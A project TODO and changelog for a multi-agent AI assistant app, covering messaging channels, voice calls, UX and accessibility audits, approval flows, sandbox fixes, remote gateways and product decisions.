# TODO

Requests queued while other work is in progress. Top of each section is next.

## Done this session (not listed below)

- [x] **Projects** (b67c0f1 + UI): pick a folder (folder browser, since the page can't open a native picker); a
      chat started in it works there (shell cwd, fs tools read/edit the real files, escapes refused) and follow-ups
      inherit it; the sidebar nests each project's chats under a collapsible folder row with "new chat here".
- [x] **Manus-style research habits** (00fead2, d04e3cb): update_todo recitation, long pages saved to scratch with
      an excerpt, scripts/APIs for bulk data, stale-knowledge guard (remembered models/prices lose to sources,
      past-year search note), stop/publish discipline.
- [x] **Model errors** (af3abfd): refusals and hard errors pause the round with the error shown and "Continue with
      <model>"; failed replies never enter context; transient errors retry quietly.
- [x] **Two team modes + Fable's orchestration fixes** — orchestrated (lead + specialist roster, per-role models,
      dormant workers, lead has no web/shell/fs) and swarm; triage tiers; auto-verify; `ask_user`; harness docs,
      `read_docs`, capability summary; team picker UI; run/workspace views.
- [x] **Swarm never spins up a lead** — one-agent swarm rounds use a peer; solo-tier work goes to the whole swarm.
- [x] **Context stored and reused on resume** — per-agent JSONL transcripts (like omp/Claude Code sessions).
- [x] **A restart no longer strands a running round** (asked 2026-10-07: "unable to send message when the agents
      are working") — `bun --watch` restarts on every edit; the round stayed "running" in the log with nothing
      running it, so new messages were refused. Rounds now record their process; at startup an orphaned one is
      logged as stopped (Resume offered) and the chat takes messages again.
- [x] Live-run fixes: ordered `create_task` in one batch, blocked tasks don't wake assignees, numbered tasks not
      deduped, no peer-made "final answer" task, `task-final` points to `reply_user`.

## Review: channels, voice, design (2026-10-08, evening)

From the re-checks of develop at 33c545e, 0b2ee59 and aeadef6: code audits, an axe-core WCAG 2.1 AA scan of 26
screen states, keyboard and 200% zoom tests, a design-system audit (71/100) and a UX copy review. Phase 1 groups run
in parallel; phase 2 (design system, copy) touches every screen and runs after phase 1 merges.

### Channels (`packages/runtime/src/channels`, Settings → Channels)

- [x] **Pairing code never checked; first approved becomes owner** — approve by typed code; toast opens the sheet;
      "Make owner" shows handle and id.
- [x] **Non-owners run with the owner's tool permissions** — their runs ask the owner for every non-read-only tool.
- [x] **IRC nicks can claim ownership** — match unverified platforms by id; never auto-assign owner from a handle.
- [x] Revoke and Dismiss one click → ConfirmButton; strangers see internal errors → generic reply; corrupt
      `channels.json` overwritten → fail loudly with a backup; flood guard silent → reply once.
- [x] "Connected" heading over an "Off" channel; token errors only as toasts; optional fields unmarked; allow-list
      without feedback; blank while loading; repeated error toasts while polling.

### Voice runtime (`packages/runtime/src/voice`, the call socket)

- [x] **Spoken yes/no prefix-matched and decides the newest approval** — whole-utterance, the one read out, read
      back; no early turn end while an approval waits.
- [x] **Crew updates reach the call model as the person's words** — send them as tool results; `answer_approval`
      only after a spoken yes/no.
- [x] Call kept alive after its socket closes during warm-up; refusals arrive as a bare 1006; several calls per chat.
- [x] Transcripts outlive deleted chats; orphan calls; no retention.
- [x] Kitten unpinned/unhashed and trusts a remote file name; Phonon unpinned; enabling voice doesn't download what it
      promises. (Phonon-2 still installs only from its Install button: it is a `uv` tool install, not a file.)
- [x] Re-transcribes the whole turn on every pause; direct calls split thoughts; turn-model failure toasts per pause;
      overlapping streams silence each other; lead narration spoken; barge-in too sensitive without the turn model;
      unguarded JSON/binary frames; "That round failed".

### Voice in the app (`apps/web/src/client/voice`, Settings → Voice)

- [x] **Hanging up while connecting leaves the mic and socket live**.
- [x] Mute leaves the mic on and the bar says "Listening"; bar doesn't name the chat or who answered; lines labelled
      "Crew"; members labelled "worker"; Call button 22px; menu without arrow keys; whole bar a live region.
- [x] Untrue privacy copy ("nothing you say leaves this machine"); download sizes not disclosed; endpoint URL
      unchecked; polls every 2 s; duplicated headings; raw engine errors; spoken messages look typed.
      ("Via the call assistant" not shown yet: `start_task` sends no flag the client can read. The call bar hides while
      Settings is open, so a live call keeps running out of sight; the shortcuts still work.)

### Trust, System page, gating

- [x] **Untrue statements**: "agents never edit your files directly", "can only write to their own scratch folder".
- [x] Raw server errors in toasts ("unauthorized", "no such colony", zod text, "needs the chat runtime").
- [x] Chats-only devices: skill keep/restore, delivering schedules, the System page.
- [x] System: "confined (unknown)", raw sandbox names and errors, own status dots, Restart without state, nothing
      while loading, "No channels set up" for a channel that is off.
- [x] Skill curator archives every old learned skill on upgrade, silently.
- [x] Chat naming can overwrite an older chat's own name; naming a deleted chat leaves a file.
- [x] omp writes request logs to the real `~/.omp/logs`; model-failure fallback preselects "Claude 4 Opus"; adding a
      project keeps you in a project-less chat. (The fallback can't yet avoid a provider-wide auth or quota failure:
      model errors aren't classified by cause.)

### Phase 2 — design system and accessibility

- [x] Radius scale out of order (`lg` 14px, `xl` 12px); 21 arbitrary radii; 56 arbitrary text sizes; no display type
      steps.
- [x] Six status dots, four badges, five hand-rolled popovers, four section/row copies, ~15 banners → `Dot`,
      `usePopover`/`Menu`, `Card`, `SectionHeader`, `Banner`; Button aliases and no loading state.
- [x] Inline field errors in 5 of 66 fields; one-click revoke/remove left; seven icons shared by two features.
- [x] WCAG: muted text 3.7:1 (30 nodes); accessible names miss the visible text (36 nodes); 49 tabs to the message
      box; menus and tabs without arrow keys; Settings badge 2.1:1; side panel covers the chat at 200% zoom.
- [x] Settings IA: a "Connect" group for Devices, Gateways, Channels, Voice; shortcuts list missing ⌥⌘1–0.
      (axe-core WCAG 2.1 AA: 0 violations on 18 screens in light and dark, down from 24 + 5 found on real data.)

### Phase 2 — copy

- [x] One word per concept (run/round, chat/New task, Allow/Approve, Delete/Remove/Revoke), jargon explained on first
      use, error messages with a cause and a fix, shorter long hints, calmer mascot moods.
      (Kept on purpose: "Crews" for the list of chats' crews; channel `/new` and `/approve` keep the platforms' own
      words. The changes check can't show the server's reason yet: RoundChanges drops it.)

### Asked during the fixes

- [x] **A refresh keeps the message box's text** (asked 2026-10-08) — each chat and the new-chat screen keep their own
      unsent text in the browser; it goes when the message is sent or the chat is deleted. Attached files can't
      survive a reload.
- [x] **A refresh stays where you were** (asked 2026-10-08) — the screen (Crews, Compare, System) and an open Settings
      section join the chat in the address, so a reload comes back to them; chats-only devices fall back to the chat.

### [decide] New

- [x] Chat naming uses the lead model (up to 3 calls per chat) — a cheap model instead? **Decided 2026-10-09: yes,
      the cheapest fast model available, falling back to the lead's.**

## UX audit (2026-10-08)

From the product-readiness inspection: every screen at 1440×900 and 960×600, two code audits, and a hands-on run
of every flow (chat, coding with approvals, /plan, crew, @mention, attach, slash commands, every Settings form,
server down). Letters are fix groups; each group owns its files so they can be worked on in parallel.
`[decide]` items change product behaviour and wait for the person's call.

### A — Runtime bugs (`packages/runtime`)

- [x] **Shell commands write into the project** — `sandbox.ts:63` sets `HOME` to the working folder, so one
      `python3 -m unittest` left 68 files under `<project>/Library/Caches/…` ("71 files changed", Commit all
      would commit them). Give commands a private home outside the project.
- [x] **Plan mode never shows the plan** — plan mode says "present it with ask_user" (`prompts.ts:310`) but
      `ask_user` has nowhere to put a plan (`question` is "a short line"). Add a plan/detail field, render it above
      the choices.
- [x] **A worker's reply to an @mention never reaches the chat** — `@ion …` after a finished round: ion answered
      (visible only in the Crews console), the lead's thinking showed instead, and the observer stopped the round
      as "stalled: every agent is idle and the work is not finished".
- [x] **"Verified" on unreviewed rounds** — with No review, steps show "judge · Judge approved" and the console
      "crew COMPLETED (verified)" while the same console says "this round is not reviewed"; Compare says "judge
      passed" next to a score of "—".
- [x] **Status line says "Drafting …" while waiting for an approval** — show "Waiting for your approval".

### B — Composer & slash menu (`chat/Composer.tsx`, `chat/TeamControls.tsx`, `chat/CommandMenu.tsx`, `chat/ModelPicker.tsx`)

- [x] **Stop hides while you type during a run** (`Composer.tsx:634`) — show Stop next to Send.
- [x] **Esc in the slash menu erases the draft** (`Composer.tsx:529`) — Esc closes the menu only.
- [x] **`/mode` + Enter runs `/model`** — an exact command name wins over a prefix match.
- [x] **`/plan` listed twice** (recent + Round); **inapplicable commands crowd the menu** ("Nothing is running" ×5
      on a new task) — sink them below the applicable ones.
- [x] **`/help` reopens the same menu**; **`/export` gives no feedback** — a toast naming the file.
- [x] **Focus stays on the Steer/Queue toggle after clicking it**, so Enter flips it instead of sending.
- [x] **Files over the limit are dropped silently** (`Composer.tsx:300`, size only checked at send) — say so when
      they are added.
- [x] **Chips truncate their own labels** ("DeepSe…", "No pr…", "D") — collapse Thinking/Reviewer/Helpers into one
      Team chip when the composer is narrow; keep the model name readable.
- [x] **Helper naming drifts** — "Never" shows as "Solo", "Always" as "Team of 3", "Auto" as "2 helpers"; the
      `/team` popover says "2 helpers · called by the lead" while the chip says "Team of 3".
- [x] **Solo throws the helper roster away** (`TeamControls.tsx:321`) — keep it and flip a flag.
- [x] **Model picker**: duplicate entries (Claude Haiku 4.5, Opus 4.5 under two ids), mixed naming ("Claude 4 Opus"
      vs "Claude Opus 4"), the sticky provider header covers half a row; helper model picker opens on top of the
      helpers popover.
      **Left:** duplicate dated ids and header overlap fixed; mixed names now normalized in the picker (`modelName()`,
      2026-10-09); Qwen/Doubao/ERNIE left as they are, and other places still show the raw name.
- [x] **@mention menu** — show each agent's face; include the lead.
- [x] **`/learn` on a trivial chat starts a paid job and never reports what it found.**
      **Left:** the result toast exists, but the "Reading this chat…" toast disappears after 3.5s while the job runs longer; needs a lasting progress line.

### C — Status, colour & time (`ui/primitives.tsx`, `chat/Sidebar.tsx`, `chat/AgentSheet.tsx`, `chat/Workspace.tsx`, `chat/StepRow.tsx`, `chat/AuditView.tsx`, `ColonyScreen.tsx`, `ColonyMap.tsx`, `Compare.tsx`, `legacy.css`)

- [x] **One status → tone map** — "waiting for you" is a red dot in the sidebar; every finished agent shows a red
      "stopped" badge above "completed"; the same state is stopped / Resting / completed on three screens; stopped
      is red, amber or grey depending on the screen. Awaiting = accent, stopped/idle = neutral, failed = red.
- [x] **Times are UTC** — `step.time.slice(11,16)` on ISO strings (`StepRow.tsx:71`, `Workspace.tsx`,
      `AuditView.tsx`, `ColonyScreen.tsx:493`); format in local time.
- [x] **Unknown cost shows `$0.000`** (Crews, Compare) — show "n/a"; durations as "23m 35s", not "1415s".
- [x] **Compare** — table overflows at 1440 (last column cut), run ids wrap over many lines, "solo · orchestrated",
      no warning when two different tasks are compared.
- [x] **Map** — "lead lead", "stopped … stopped", no links between agents.
      Links between agents drawn (2026-10-09), weighted by messages; the map's colours now follow the theme.
- [x] **Accessible names include the sleeping "z"** ("z lead stopped …") from the pixel face.
- [x] **legacy.css uses the amber accent as text** (~1.9:1, `legacy.css:121,174`); `.pill`/`.dot` duplicate
      `Badge`/`Dot`.

### D — Chat stream & cards (`chat/RoundView.tsx`, `chat/Markdown.tsx`, `chat/QuestionCard.tsx`, `chat/ApprovalCards.tsx`, `chat/RoundChanges.tsx`, `chat/DiffView.tsx`, `chat/GitView.tsx`)

- [x] **Bold text containing code shows raw backticks** (`Markdown.tsx:28` doesn't parse inside `**…**`); markdown
      headings render as `<p>`.
- [x] **Question answers are lost if sending fails** (`QuestionCard.tsx:57` marks sent first); "Adjust the plan"
      should open its text box; two Skip buttons ("Skip", "Skip all, you decide").
- [x] **Approval cards** — an approved card vanishes from the chat; the card renders above the lead text that came
      before it; Approve/Deny are 22px tall.
- [x] **No "jump to latest"** once you scroll up during a run (`hooks.ts:124`).
- [x] **Screen readers re-read the reply on every streamed chunk** (`RoundView.tsx:559` aria-live).
- [x] **"No changes in <project>" rows** after every turn and before work starts — hide when nothing changed.
- [x] **Run stopped card + red Stopped banner** say the same thing twice — merge.
- [x] **"Checking…" can spin forever** when the changes fetch fails (`RoundChanges.tsx:50,89`).
- [x] **Diff / Git** — junk files listed first, no folder grouping or "binary" label, paths cut at the end (cut
      the middle), Git panel not refreshed after Rewind.

### E — Settings (`Settings.tsx`, `ui/primitives.tsx` Field, `chat/SpecialistEditor.tsx`, `chat/MadeTools.tsx`)

- [x] **One-click deletes with no confirm or undo** — credentials, custom providers, MCP servers, specialists,
      schedules, memories, kept tools (`MadeTools.tsx:150`); **Revoke device** has no confirm and shows for this
      device (`Settings.tsx:2153`). Reuse the plugin page's two-step remove.
- [x] **Validation fails silently** — custom endpoint: name silently lowercased ("my server!"), "not a url"
      accepted, Connect just stays disabled; `NumberField` snaps back; custom cron never checked. Inline errors.
- [x] **Form labels aren't linked to fields** (0 `htmlFor` across 36 `Field`s) — `Field` generates the id.
- [x] **Hooks lose unsaved edits silently** when you switch section; **a failed autosave** only toasts and the header
      returns to "saved" — keep "Couldn't save · Retry".
- [x] **Settings navigation** — 14 flat sections in an odd order; group into Setup (Models, Team & budget,
      Reviewer), Agents (Specialists, Instructions, Memory, Skills), Extend (Tools, Plugins, Hooks, Schedules),
      You (General, You & mascot, Devices); at 960 wide the nav and app sidebar leave ~400px.
- [x] **New specialists get every tool** (Web, Shell, Files, Browser, MCP) — start from the least access; native
      select for hundreds of models → ModelPicker. (Default tools kept on, decided 2026-10-09.)
      **Left:** validation and ModelPicker done; the default tool set is unchanged, see [decide].
- [x] **Providers page** — jargon ("omp's provider stack in-process", models.dev), a raw folder path, 80 sign-ins,
      "Sign in again" but no Sign out; Devices offers "Pair a device" on a local-only install; the Hooks "run as
      you, outside the sandbox" warning is plain small text.
- [x] **Skills page** — every `~/.claude/skills` skill is on by default, shown as walls of text with raw paths.
      (Kept on, decided 2026-10-09.)
      **Left:** descriptions clamped and paths moved to tooltips; which skills are on by default is a [decide] item below.

### F — First run, loading & errors (`App.tsx`, `chat/Hero.tsx`, `api.ts`, `DeviceGate.tsx`, `chat/FolderPicker.tsx`)

- [x] **No path from first run to a model** — with no key the model picker says `No models match ""` and Send toasts
      "Choose a lead model first"; Settings can't be opened at Models. Setup card on the home screen, call to action
      in the picker, providers page pins the big providers when none is ready.
- [x] **No composer until `/api/models` succeeds** (`App.tsx:669`) — render it disabled with a retry.
- [x] **Server down shows raw "Failed to fetch"** banner + toast — "Reconnecting…" state; map HTTP errors to plain
      copy (`api.ts:44`); 401 on a remote gateway goes back to pairing.
- [x] **"Chats only" devices see everything** — `whoami().me.scope` is never read; hide Settings, Terminal, Devices,
      Plugins for that scope.
- [x] **Empty states flash before data loads** (sidebar, Crews, `?chat=` deep link; a bad id stays on the hero).
- [x] **New chat resets the composer** to the default lead and helpers, dropping what the person picked.
      Within one browser the pick survives the New chat buttons, ⌘N, a project's new chat and a reload (tested). It
      was lost wherever the page's storage is new: another browser and the desktop app, which serves each launch
      from a new port. The last pick is now kept on the server (`composer` in settings.json, PUT
      /api/settings/composer) and wins over the browser's copy; a default crew saved with no crewmates no longer
      comes back with two.
- [x] **Adding a project leaves the open chat** and lands on a new task.
- [x] **The home greeting quotes the last chat title** (`"Add a multiply(a,…" is done`); the "G 26×29" selection
      box over the greeting reads as a bug.
- [x] **960×600: the mascot pushes the composer off-screen** — shrink it on short windows.

### G — Workspace panel & sidebar (`chat/Workspace.tsx` rail, `chat/Sidebar.tsx`, `App.tsx` layout)

- [x] **The Files panel opens on every chat, even "No files yet"** (~440px) — open it when there is content.
- [x] **Rail of 10 unlabeled icons with "99+" badges**; Terminal does nothing without a project and doesn't say
      why; the rail doesn't scroll at 600px tall; Team tab has no empty state.
- [x] **Search matches titles only** ("391" finds nothing); deleting a chat has no undo.
      Undo after deleting a chat done (2026-10-09): 8s Undo toast or ⌘Z; nothing is deleted until it lapses.
- [x] **Chat titles are the prompt verbatim** ("Hi", "Hi", "hi") — short generated titles. (Done as 12b.)
      **Left:** not done: short titles need a model call (cost), see [decide].
- [x] **Unexplained sidebar numbers** (5, 2, 3).
- [x] **Dead mobile code** contradicts the 960px minimum (`App.tsx:559-583`, Sidebar `md:` variants).

### H — Copy & design system (`copy.ts`, `tokens.css`, `styles.css`)

- [x] **Glossary pass** — crew/colony/team/helpers/peers, Judge/Reviewer/Verdicts/verifier, round, "Observer
      interval", "PASS on colony", Steer/Queue ("Send now" / "After this step"); raw backend strings rendered as-is.
- [x] **Tokens bypassed** — 12 arbitrary radii and no `--radius*` use, 7 sizes between 11–14px, `--scrim` unused,
      dark theme written twice; destructive fill ~2.9:1 white-on-red; hit targets under 24px.
- [x] **In-app Reduce motion** doesn't reach `useReducedMotion()` users (Hero, cursor, pixel); `.caret` blinks
      forever.
- [x] **Modals** — no focus trap; one Esc closes two stacked modals (`Modal.tsx:24`); AgentSheet doesn't move or
      restore focus.

### Follow-ups found while fixing

- [x] Contrast below 4.5:1 left: dark avatar initials in the Git view (2.57:1), muted text on `fill-strong` (4.04:1).
- [x] Hit targets under 24px remain in a few places outside the composer, chat and Settings.
- [x] The crew console's Reviews list and activity still name the reviewer by its runtime id (`llm-judge#0`); the
      replay bar shows the raw `checkpoint/restored` event type.
- [x] No test for the modal Escape stack and focus trap (needs a DOM test setup); the artifact viewer opened inside
      the crew console was not exercised by hand.
- [x] `/learn`: keep a progress line while the review runs (the toast disappears after 3.5s).
- [x] Mail panel shows a sender's name in their agent colour on the light surface (`Workspace.tsx`), as low as 1.9:1.
      Name in ink now, the colour on a dot beside it.
- [x] Mattermost, LINE and WhatsApp Cloud still post press notes that only echo the message (one line each to skip). Done.
- [ ] Teams file consent card (native OneDrive upload in personal chats); Matrix end-to-end encryption needs
      `@matrix-org/matrix-sdk-crypto-nodejs` (native) — a new dependency, ask first.
- [x] Message search scans the messages table with `instr`; move to FTS5 if chat history grows large (FTS5 trigram
      can't match queries under 3 characters).

### [decide] Product calls

- [x] Default project permission is **Autonomous** (edits and commands without asking) — make "Ask first" the
      default? **Decided 2026-10-09: Ask first.**
- [x] Spend limit per round defaults to **0 = no limit** (one stored run cost $6.90) — default cap? **Decided
      2026-10-09: $5 per run.** Done; the cap now counts only the run (it compared the chat's running totals before).
      Settings saved before keep their stored 0 = no limit (a migration would change that).
- [x] Helpers default to **Claude Opus 5.5**; pickers show no prices — cheaper default, show $/Mtok? **Decided
      2026-10-09: keep as is.**
- [x] **"Approve all for this chat"** on approval cards (7 approvals for one small fix). **Decided 2026-10-09: yes,
      per chat, per kind of step, shown as a chip that can be revoked.** Done for file changes and commands; channels
      have no button for it yet.
- [x] Desktop shell: native menu bar (⌘N new chat, ⌘K palette, ⌘, Settings window), window chrome inset for the
      traffic lights, dock badge when a chat waits, system folder picker, "Show in Finder" / "Save to project" on
      files. Done 2026-10-09 on Electrobun 2.0.2 (apps/desktop, docs/desktop.md; `bun run desktop`). Left: real
      menu clicks/⌘ keys untested, voice calls in WKWebView and in the compiled server untested, code signing, app icon,
      a server left running if the app crashes, notification clicks can't open their chat.
- [x] Merge Crews (ColonyScreen) into the chat Workspace so there is one console. **Decided 2026-10-09: keep both.**
- [x] New specialists start with every tool on (Web, Shell, Files, Browser, MCP) — start from the least access?
      **Decided 2026-10-09: keep everything on.**
- [x] Every `~/.claude/skills` skill is on by default for Myrmidon agents — off until switched on? **Decided
      2026-10-09: keep on.**
- [x] Short generated chat titles (one cheap model call per new chat)? Done as 12b; cheap model decided above.

## Next

Open work, in the order it will be done:

0. - [x] **Answers stay in the question card** (done, merged to develop) — answering a question card
      sent a separate "question → answer" bubble and started the next round under a divider; the card should show the
      picks itself (kept across reloads, with the read receipt) and the round continue seamlessly.
0. - [x] **Next-word suggestions in the composer, Tab to accept** (done, merged to develop) — history → next
      word → finish word; saved 43.6% of keystrokes on 3,530 real prompts vs 34.6% Warp-style, 24.7% zsh.
0. - [x] **Neural next-word fallback** (done, merged to develop; Pythia-14M, off by default) — Settings → General
      "Smarter next words" downloads the pinned 17 MB model; the composer asks it after a space when history has
      nothing, shown at ≥ 0.3 confidence, a few ms a word.
0. - [x] **Agent feedback, round 2** (1–5 done, merged; 6 leftovers wait for the person's OK) (2026-10-09; report: probe chat `i-built-this-harness…`, artifact
      `myrmidon-feedback.md` §0). In order:
      1. A task with no required files can never pass: `Verifier.verifyTask` (verifier.ts:51) fails any task with
         `artifacts: []` ("no artifacts were submitted"), even when its brief says "a note + a message, no files". Let
         a task whose `outputs` are empty pass on its note/message, or make `create_task` require outputs; and have
         `submit_task` warn at once instead of an async rejection.
      2. `ask_crewmate(to: <unknown name>)` silently creates a new crewmate (colony.ts `askCrewmate`): validate
         against the crew, or say "not on the crew, bringing in <name> as …" in the result and the tool description.
      3. Sandboxed shell `env` exposes the host `$PATH` (app names, ~/Desktop/Myrmidon): give sandboxed commands a
         minimal PATH of toolchains only (check against the sandbox-reads work).
      4. `run_checks` outside a project has no typecheck path: let it run in the agent's scratch folder when there is
         a package.json/tsconfig there.
      5. A non-member can read a group but not reply; `read_messages` right after `update_group(remove)` showed the
         old members once (read-after-write race): check `host.state()` freshness after append.
      6. Leftovers from the probe (task1-findings.md, task2-findings.md, earlier probe files and tools) — the person
         chose to keep round-1 leftovers; ask before removing.
0. - [x] **Schedules at any time** (done, merged to develop) — presets were fixed at 9:00; now a
      repeat (hour, day, weekdays, chosen days, monthly, custom cron), a time and days, said in plain words, and
      Change edits a saved schedule.
0. - [x] **Crewmates out of sync across rounds** (done: reads per person, missed mail waits for the next wake) (2026-10-09, "play a game" chat) — when a round completes, `_end()`
      stops every agent and drops mail still in its inbox or steered queue; the next round wakes them with only the
      new message, so a crewmate's memory is stale and it answers an old message (zephyr replied to "It's a BOOK!"
      #1125 after the new topic #1164). Also `mail.delivered` is one flag per message, so a group message read by one
      member shows as read by all. Fix: per-recipient delivery, and carry undelivered mail into the next round.
0. - [x] **A chat round ends mid-conversation** (done: the speaker signs off after its final answer; the round closes once the crew is quiet, capped at 2 min) — the lead's final answer completes the round at once (review off),
      aborting crewmates mid-turn; bix's last message was never delivered (one tick). It should behave like a human
      chat: let the conversation settle before the round ends.
1. - [x] **Crew mail like a conversation** (done: messaging norms, threads, reply reminder, chat-style Mail tab) — agents see mail and ignore it; they should read and reply, coordinate
      like people in a chat (the person's words: "make it more human").
2. - [x] **Plugins phase 4: agents build plugins** (done) — create_plugin / test_plugin / propose_plugin and the speaker
      brief; a request for a Myrmidon feature becomes a plugin the person switches on (spec 2026-10-07-plugins).
3. - [x] **Per-tool MCP approvals** (done) (OpenDots) — tools a server marks read-only run on their own, others ask; each
      tool switchable and kept across refreshes; an approval binds to the exact tool and arguments.
4. - [x] **Stop a turn when a permission changes** (done) (OpenDots) — revoking a permission, disabling a tool or pausing
      aborts the agent's in-flight turn at once.
5. - [x] **Interrupted runs: review before retry** (done) (OpenDots) — a round stopped mid-way after side effects outside
      Myrmidon (MCP writes, shell) shows what it already did before resuming.
6. - [x] **Streaming replies** (lead-first step 2) — the lead's text appears as it is written.
7. - [x] **Helpers appear quietly** (lead-first step 3 remainder) — "Brought in nova (research) and kai (frontend)"
      as one compact line when the lead adds agents.
8. - [x] **Personal entry page + mascot customisation** — one smart headline (no subtext) in the mascot's voice,
      from what happened while the person was away, written by the lead model with a built-in fallback; name from
      the computer account, editable; Settings → You & mascot: eyes, look (pixel flower / pixel bow tie), colour,
      and what the screen shows (rotating clock / HI NAME / crew at work).
8b. - [x] **Crew group chats** (asked 2026-10-07) — besides one-to-one mail, agents can start group chats with some
      of the crew, and there is one team chat everyone is in; used like people use WhatsApp groups ("make it more
      human like"). The Mail tab shows them as conversations. Also fix the reminder's side effect seen on
      2026-10-07: agents send "✔ end of thread, please don't reply" / "sent only to clear the unanswered-mail flag"
      just to quiet it; a message that needs no answer (an ack, "no reply needed") should close the thread.
8d. - [x] **Plugin reload test is flaky under load** — done 2026-10-08. Reproduced (4 of 8 parallel runs): on macOS a
      new watch drops writes made in its first moment, and it also reports writes from before it began, so every
      plugin loaded twice at start and one that keeps data in its own folder reloaded itself in a loop. A file event
      now rebuilds and reloads only when the code differs, loads of one plugin run one after another, and a check
      shortly after the watch begins catches a missed edit (16 of 16 parallel runs pass).
8c. - [x] **Browser flow test fails when run alone** — 2026-10-08: no longer reproduces (9 of 9, alone and in parallel,
      same Chrome 154.0.8037.98); why the page closed then is not known. Fixed what made it fail confusingly: a failed
      step's message no longer gives way to the page snapshot's own error ("Session closed").
9. - [x] **Review-before-save cards** (OpenDots) — wherever Myrmidon already asks, the card shows the change in full
      (a file against what is there, a commit's patch, a command, a call's arguments); text can be rewritten before
      approving and a decline can carry a note; `propose` lets an agent show a file or commit first; approved writes,
      commits and MCP calls keep a receipt so the same call in the same round is not run twice. Not yet looked at
      in the browser (needs a live round waiting on a review).
9b. - [x] **@mention a worker from the composer** (asked 2026-10-07; the person chose: the worker replies directly,
      an idle crew starts a round with that worker) — typing @ offers the crew; the worker hears it (the lead is only
      told) and answers with reply_person under its own name; in a round opened that way its answer finishes it.
10. - [x] **Saved specialist agents** (OpenDots) — Settings → Specialists (name, specialty, instructions, model,
      tool groups); joined from the team picker, by the lead with spawn_worker(specialist), or saved from a worker's
      sheet; a kept specialist always works as currently saved.
11. - [x] **Learn skills from past chats** (OpenDots idea; built after Qwen Code's skill review) — a reviewer reads a
      finished round with 20+ tool calls (or any, with /learn or the round's button) and proposes a skill or an update
      to a learned one (`source: learned`, never the person's own); kept or discarded in the chat card or Settings →
      Skills; kept skills go to every chat.
11b. - [x] **Retire stale learned skills** — done 2026-10-08, after Hermes's curator (the curator noted here as Qwen
      Code's is Hermes's). Each use_skill load is counted (`skills-usage.json`); learned skills unused 30 days show
      "unused" (still offered; using one makes it active), at 90 they move to `skills/.archive/` (never deleted);
      Keep pins one; Settings → Skills shows uses and restores archived ones. Checked at start and every 6 hours.
      Skills the person wrote or installed are never touched. Not done: Hermes's model pass that merges
      near-duplicates (the skill reviewer already proposes changes). Badges not yet seen in the browser (no learned
      skills on this machine yet).
11c. - [x] **Remote gateways** (asked 2026-10-08, "like Hermes agent / OpenClaw"; research
      docs/research/2026-10-08-remote-gateways.md, spec docs/superpowers/specs/2026-10-08-remote-gateways-design.md)
      - [x] Step 1: remote server mode — --host/--public-url, exact Host/Origin allowlist, device pairing
        (`myrmidon pair`, single-use 10-minute codes), HttpOnly device cookies (`__Host-` over HTTPS), full/chat
        scopes, Settings → Devices with revoke, auth audit log, docs/remote.md.
      - [x] Step 2: previews from a remote gateway — --preview-port/--preview-url, per-device preview keys (revoke
        ends previews), preview Host allowlist, a note instead of a broken frame when a device has no preview address.
      - [x] Step 2b (asked 2026-10-08): set up a VPS gateway from the CLI alone — `myrmidon setup` wizard, `login`
        (device codes, pasted redirect or an SSH-forwarded callback; full auth URL instead of omp's loopback
        launcher), `key` (hidden or piped), `model` (saved once it answers), `doctor` (runs the sandbox, exits 1 on
        problems); SIGTERM shuts `serve` down cleanly for systemd.
      - [x] Step 3: one client, N gateways — Settings → Gateways (pair by link), gateways.json (0600) keeps tokens
        off the page, /gw/<id> forwards API calls and bridges sockets, previews through the hub's preview origin,
        sidebar switcher per window, HTTP + socket health, a "can't reach" screen; revoking a device now closes all
        its sockets (terminals too); Bun's stop() hang after server-closed sockets worked around.
11d. - [x] **Channels** (asked 2026-10-08, "like OpenClaw and Hermes"; research docs/research/2026-10-08-channels.md,
      spec docs/superpowers/specs/2026-10-08-channels-design.md)
      - [x] Step 1: channel core + Telegram text — ChannelHub (pairing codes, owner/members, groups by approval and
        mention, one chat per conversation, /new /stop /status /help, status line, chunked answers, dedupe and saved
        offset), Telegram over plain HTTP, Settings → Channels, `myrmidon channels`, doctor, docs/channels.md.
      Asked 2026-10-08: "port everything they do" (OpenClaw + Hermes, both MIT; adapt onto ChannelHub, credit them).
      - [x] Step 2 (core parity): approve/deny and question buttons (text /approve fallback), delivery ledger with
        retries and restart replay, media in (photos, files) and out (round files), voice notes transcribed,
        streaming modes (progress | partial | final), access policies (pairing | allowlist | open | disabled for
        DMs and groups, mention on/off), group sessions per user, a `send_message` tool for agents, schedules that
        deliver to a channel, `ctx.channels.register` for plugins, webhook ingress for webhook-based platforms.
      - [x] Step 3: WhatsApp (Baileys linked device; Meta Cloud API).
      - [x] Step 4: Discord, Slack.
      - [x] Step 5: Signal (signal-cli), iMessage (BlueBubbles), Matrix, Mattermost, email (IMAP/SMTP).
      - [x] Step 6: Microsoft Teams, Google Chat, LINE, SMS (Twilio), Feishu/Lark, DingTalk, WeCom.
      - [x] Step 7: IRC, Twitch, X, Nostr, Zalo, Synology Chat, Nextcloud Talk, ntfy, SimpleX, Tlon, WeChat, QQ, webhook.
      - [ ] Follow-ups: try each against the real service (all tested only with fakes); Feishu long connection,
        DingTalk Stream and QQ gateway were written without SDK source; Matrix encryption; Teams/Google Chat/LINE
        file sending; Slack/Discord webhook modes; press notes flagged by the hub instead of string checks.
11e. - [x] **Channels UI and usage redesign** (asked 2026-10-08) — done: every app's logo (Simple Icons, CC0, inline);
      Settings → Channels as a logo gallery (connected first, then grouped and searchable) with a sheet per app (Setup,
      People, Rules, Activity); logos on chats from a channel; a waiting count on Settings and Channels; a toast with
      Approve and a desktop notice on a new request. Spec 2026-10-08-channels-ui-and-gateway-status-design.
      Follow-up: try the request toast and the waiting badges against a real platform.
11f. - [x] **Gateway indicator and inspector** (asked 2026-10-08) — done after OpenClaw: a sidebar chip only when
      something is wrong ("Offline · Retry", or the problem, opening System); a System page with the gateway, models,
      sandbox, what is running, each channel's health (last in/out, reconnects, last error, Restart) and recent activity.
12. - [x] **Voice calls (in the app)** — done 2026-10-08 (docs/voice.md; spec 2026-10-08-voice-calls-design): Call in
      the chat toolbar; Phonon-2 STT (local, installed with uv) and Kitten TTS (local, worker process) by default, or
      omp's cloud speech, or any OpenAI-compatible endpoint; a fast call model that hands work to the crew as rounds,
      keeps talking, reports back, asks before approvals; barge-in; transcripts as call cards; Settings → Voice.
      Follow-ups:
      - [ ] Try a real call with the mic (only the engines, the socket and Settings were checked live).
      - [x] Voice calls off by default; on, the chosen engines download (if missing) and warm, so calls answer at
        once; Silero VAD (16 kHz, 1.3 MB) finds turns instead of loudness alone (asked 2026-10-08).
      - [x] Call the lead or a crew member directly, or the call assistant (which can now ask them); the next message
        after a call carries its transcript to the crew; call cards placed among rounds by time (asked 2026-10-08).
